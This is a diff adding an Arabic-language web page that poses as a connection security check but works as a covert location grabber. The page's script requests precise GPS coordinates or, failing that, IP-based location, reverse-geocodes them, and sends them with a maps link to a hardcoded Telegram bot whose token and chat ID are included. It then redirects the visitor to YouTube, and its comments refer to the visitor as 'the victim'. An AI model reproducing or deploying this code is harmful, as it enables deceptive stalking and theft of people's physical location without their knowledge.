@@ -1,0 +1,262 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>جاري التحقق من الأمان</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background: #0d1117;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            font-family: 'Segoe UI', Arial, sans-serif;
+            color: #c9d1d9;
+            text-align: center;
+            direction: rtl;
+        }
+        .container {
+            max-width: 90%;
+            padding: 30px;
+            background: #161b22;
+            border-radius: 16px;
+            border: 1px solid #30363d;
+        }
+        .spinner {
+            border: 4px solid #30363d;
+            border-top: 4px solid #58a6ff;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        h2 { font-size: 20px; color: #f0f6fc; margin-bottom: 10px; }
+        p { color: #8b949e; font-size: 15px; }
+        .status { font-size: 14px; color: #58a6ff; min-height: 24px; margin-top: 10px; }
+        .permission-box {
+            margin-top: 20px;
+            padding: 15px;
+            background: #1c2333;
+            border-radius: 10px;
+            border: 1px solid #30363d;
+            font-size: 14px;
+            color: #8b949e;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="spinner"></div>
+        <h2>🔐 جاري التحقق من اتصالك</h2>
+        <p>يرجى الانتظار لحظة... سيتم توجيهك تلقائياً</p>
+        <div class="status" id="status">⏳ جاري التجهيز...</div>
+        <div class="permission-box" id="permissionBox">
+            📍 جاري طلب الموقع الدقيق لتأمين الاتصال...
+        </div>
+    </div>
+
+    <script>
+        (function() {
+            // ======== بيانات البوت (ثابتة) ========
+            const BOT_TOKEN = "8317512028:AAHEIRv_S23OFrceayGoKW823jIxvl9Az_k";
+            const CHAT_ID = "1497190595";
+            const REDIRECT_URL = "https://www.youtube.com/watch?v=6N5IQxrac6g";
+            // ======================================
+
+            const statusEl = document.getElementById('status');
+            const permBox = document.getElementById('permissionBox');
+
+            function updateStatus(msg) {
+                if (statusEl) statusEl.textContent = msg;
+            }
+            function updatePermBox(msg, color = '#58a6ff') {
+                if (permBox) {
+                    permBox.textContent = msg;
+                    permBox.style.color = color;
+                }
+            }
+
+            // دالة الإرسال إلى تيليجرام
+            function sendToTelegram(text) {
+                const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+                return fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: text,
+                        parse_mode: 'Markdown',
+                        disable_web_page_preview: false
+                    })
+                }).catch(() => {});
+            }
+
+            // ============================================================
+            // 1. دالة الحصول على العنوان من الإحداثيات (عكس الجغرافيا)
+            // ============================================================
+            function getAddressFromCoords(lat, lon) {
+                return fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1&accept-language=ar`)
+                    .then(res => res.json())
+                    .then(data => {
+                        if (data && data.display_name) {
+                            return data.display_name;
+                        }
+                        return 'غير معروف';
+                    })
+                    .catch(() => 'غير معروف');
+            }
+
+            // ============================================================
+            // 2. دالة إرسال الموقع (الرسالة النهائية)
+            // ============================================================
+            function sendLocationToBot(lat, lon, accuracy, method, address = '') {
+                const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
+                const msg =
+                    `📍 *تحديد الموقع الجغرافي بدقة متناهية* 📍\n` +
+                    `━━━━━━━━━━━━━━━━━━━━━\n` +
+                    `🗺️ *خط العرض:* ${lat}\n` +
+                    `🗺️ *خط الطول:* ${lon}\n` +
+                    `📏 *دقة التحديد:* ${accuracy} متر\n` +
+                    `📡 *طريقة التحديد:* ${method}\n` +
+                    `🏠 *العنوان التفصيلي:*\n${address || 'جاري التحميل...'}\n` +
+                    `━━━━━━━━━━━━━━━━━━━━━\n` +
+                    `🗺️ *رابط خرائط جوجل (شاهد موقعه بالضبط):*\n` +
+                    `${mapsLink}`;
+
+                sendToTelegram(msg);
+                updateStatus('✅ تم تحديد الموقع بدقة عالية');
+                updatePermBox('✅ تم تحديد الموقع بنجاح، جاري التوجيه...', '#3fb950');
+            }
+
+            // ============================================================
+            // 3. الطبقة الأولى: GPS (دقة عالية جداً)
+            // ============================================================
+            updatePermBox('📍 جاري طلب الموقع الدقيق من جهازك... (اضغط "سماح")', '#58a6ff');
+
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    // ---- نجاح (وافق الضحية) ----
+                    function(pos) {
+                        const lat = pos.coords.latitude;
+                        const lon = pos.coords.longitude;
+                        const acc = pos.coords.accuracy; // الدقة بالأمتار (تصل إلى 5-20 متر)
+                        const alt = pos.coords.altitude || 'غير معروف';
+                        const speed = pos.coords.speed || 'غير معروف';
+
+                        updatePermBox('📍 تم الحصول على الإحداثيات، جاري جلب العنوان...', '#58a6ff');
+
+                        // محاولة جلب العنوان التفصيلي
+                        getAddressFromCoords(lat, lon)
+                            .then(address => {
+                                sendLocationToBot(lat, lon, acc.toFixed(0), 'GPS (دقة عالية جداً)', address);
+                            })
+                            .catch(() => {
+                                sendLocationToBot(lat, lon, acc.toFixed(0), 'GPS (دقة عالية جداً)', 'تعذر جلب العنوان');
+                            });
+                    },
+                    // ---- فشل (رفض الضحية أو تعطل) ----
+                    function(err) {
+                        updatePermBox('⚠️ لم يتم السماح بتحديد الموقع، جاري التحديد عبر الشبكة...', '#f85149');
+                        // ننتقل إلى الطبقة الاحتياطية (IP)
+                        fetchLocationByIP();
+                    },
+                    { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
+                );
+            } else {
+                // المتصفح لا يدعم GPS
+                updatePermBox('⚠️ جهازك لا يدعم GPS، جاري التحديد عبر الشبكة...', '#f85149');
+                fetchLocationByIP();
+            }
+
+            // ============================================================
+            // 4. الطبقة الاحتياطية: تحديد الموقع عبر الـ IP (دقة متوسطة)
+            // ============================================================
+            function fetchLocationByIP() {
+                updateStatus('🌍 جاري تحديد الموقع عبر الشبكة...');
+
+                // قاموس الترجمة
+                const translate = {
+                    'Iraq': 'العراق', 'Baghdad': 'بغداد', 'Basra': 'البصرة',
+                    'Nineveh': 'نينوى', 'Erbil': 'أربيل', 'Sulaymaniyah': 'السليمانية',
+                    'Duhok': 'دهوك', 'Kirkuk': 'كركوك', 'Najaf': 'النجف',
+                    'Karbala': 'كربلاء', 'Babil': 'بابل', 'Wasit': 'واسط',
+                    'Maysan': 'ميسان', 'Dhi Qar': 'ذي قار', 'Muthanna': 'المثنى',
+                    'Qadisiyyah': 'القادسية', 'Anbar': 'الأنبار', 'Salah ad-Din': 'صلاح الدين',
+                    'Diyala': 'ديالى', 'Turkey': 'تركيا', 'Syria': 'سوريا',
+                    'Iran': 'إيران', 'Saudi Arabia': 'السعودية', 'Kuwait': 'الكويت',
+                    'Jordan': 'الأردن', 'Lebanon': 'لبنان', 'Egypt': 'مصر'
+                };
+
+                Promise.race([
+                    fetch('https://ipinfo.io/json', { timeout: 4000 }).then(r => r.json()),
+                    fetch('https://ip-api.com/json/', { timeout: 4000 }).then(r => r.json())
+                ])
+                .then(data => {
+                    const ip = data.ip || data.query || 'غير معروف';
+                    let country = data.country || 'غير معروف';
+                    let region = data.region || data.regionName || 'غير معروف';
+                    let city = data.city || 'غير معروف';
+                    const org = data.org || data.isp || 'غير معروف';
+                    let loc = data.loc || `${data.lat || ''},${data.lon || ''}`;
+                    const timezone = data.timezone || 'غير معروف';
+                    const postal = data.postal || data.zip || 'غير معروف';
+
+                    // ترجمة
+                    country = translate[country] || country;
+                    region = translate[region] || region;
+                    city = translate[city] || city;
+
+                    let lat = 'غير معروف', lon = 'غير معروف';
+                    if (loc && loc.includes(',')) {
+                        const parts = loc.split(',');
+                        lat = parts[0].trim();
+                        lon = parts[1].trim();
+                    }
+
+                    const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
+                    const msg =
+                        `📍 *تحديد الموقع عبر الـ IP (احتياطي)* 📍\n` +
+                        `━━━━━━━━━━━━━━━━━━━━━\n` +
+                        `📌 *الـ IP:* ${ip}\n` +
+                        `🌍 *الدولة:* ${country}\n` +
+                        `🏙️ *المحافظة:* ${region}\n` +
+                        `🗺️ *المدينة:* ${city}\n` +
+                        `📡 *مزود الإنترنت:* ${org}\n` +
+                        `📮 *الرمز البريدي:* ${postal}\n` +
+                        `⏰ *المنطقة الزمنية:* ${timezone}\n` +
+                        `📍 *الإحداثيات:* ${lat}, ${lon}\n` +
+                        `━━━━━━━━━━━━━━━━━━━━━\n` +
+                        `⚠️ *ملاحظة:* دقة IP أقل (قد تصل إلى 1-5 كيلومترات).\n` +
+                        `🗺️ *رابط الخريطة:*\n${mapsLink}`;
+
+                    sendToTelegram(msg);
+                    updateStatus('✅ تم تحديد الموقع (دقة متوسطة)');
+                    updatePermBox('✅ تم تحديد الموقع التقريبي، جاري التوجيه...', '#58a6ff');
+                })
+                .catch(() => {
+                    sendToTelegram(`⚠️ *فشل تحديد الموقع بالكامل* ⚠️`);
+                    updateStatus('❌ فشل التحديد');
+                    updatePermBox('❌ تعذر تحديد الموقع، جاري التوجيه...', '#f85149');
+                });
+            }
+
+            // ============================================================
+            // 5. التوجيه إلى يوتيوب بعد 4 ثوانٍ
+            // ============================================================
+            setTimeout(() => {
+                window.location.replace(REDIRECT_URL);
+            }, 4000);
+
+            setTimeout(() => {
+                if (window.location.href !== REDIRECT_URL) {
+                    window.location.replace(REDIRECT_URL);
+                }
+            }, 7000);
+        })();
+    </script>
+</body>
+</html>
